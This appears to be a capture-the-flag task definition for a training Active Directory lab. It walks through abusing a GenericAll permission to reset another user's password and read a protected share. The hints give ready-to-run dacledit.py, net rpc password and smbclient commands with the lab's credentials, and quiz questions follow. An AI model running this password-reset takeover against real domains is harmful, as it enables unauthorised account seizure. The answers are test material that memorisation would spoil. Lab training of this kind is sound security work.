objectives.title: Read the flag
objectives.prompt: From the hodor foothold, find the GenericAll control edge over maester.luwin, abuse it to reset maester.luwin's password (no old password needed), then authenticate as maester.luwin and read flag.txt from the //dc/archive share that only maester.luwin may open.
hints: hodor is a normal domain user (hodor / Hodor123!). Point your resolver and /etc/krb5.conf at the DC, then read the DACL of candidate users to find an ACE granting hodor full control: dacledit.py -action read -principal hodor -target-dn '<DN>' -dc-ip <dc> 'NORTH/hodor:Hodor123!' (or a BloodHound GenericAll edge). The target is maester.luwin.

GenericAll (full control) over a user object includes the right to reset its password without knowing the current one. Force a new password: net rpc password maester.luwin 'NewPassw0rd!' -U 'NORTH\hodor%Hodor123!' -S dc.north.sevenkingdoms.local (or bloodyAD set password over LDAPS).
Authenticate as maester.luwin with the password you just set and read the flag: smbclient //dc/archive -U 'NORTH\maester.luwin%NewPassw0rd!' -c 'get flag.txt'. hodor itself is denied that share.

steps.title: Name the technique
steps.prompt: What class of attack abuses an over-permissioned access-control entry (such as GenericAll or GenericWrite) to take control of a target principal?

steps.title: Name the ACE
steps.prompt: Which access right does hodor hold over the target, giving full control of the object? (name of the right)

steps.title: Find the target
steps.prompt: Which higher-value account does hodor control via the ACE? (username)

steps.title: Name the primitive
steps.prompt: Which takeover primitive does GenericAll enable here, letting you set a new password without the old one? (two words)

steps.title: Name the extended right
steps.prompt: GenericAll includes which control-access right that specifically permits forcing a password without the current one? (name or its common label)
